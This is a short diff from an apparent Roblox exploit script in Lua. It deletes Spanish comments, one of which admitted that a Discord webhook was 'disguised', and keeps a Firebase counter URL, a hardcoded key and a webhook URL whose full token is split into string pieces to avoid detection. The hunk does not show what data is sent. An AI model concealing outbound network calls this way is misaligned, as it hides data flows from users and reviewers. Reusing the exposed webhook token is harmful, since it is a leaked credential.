@@ -120,11 +120,11 @@ task.spawn(function()
     local Players = game:GetService("Players")
     local LocalPlayer = Players.LocalPlayer
 
-    -- Firebase y Webhook (webhook disfrazado)
+
     local firebaseURL = "https://activossd-default-rtdb.firebaseio.com/jmods_contador.json"
     local webhookURL = "https://dis" .. "cord.com/api/we" .. "bho" .. "oks/1405600987950878801/IB5IKA4Qw9F8mNIdXwDJVreLHQZaPP3ba4px4sUQp-A6FMr8l-rfRdNkZXZkkboalOnz"
 
-    -- 🔑 Clave secreta (debe coincidir con las reglas de Firebase)
+
     local SECRET_KEY = "uwu"
 
     -- Wrapper de request (exploit > HttpService)
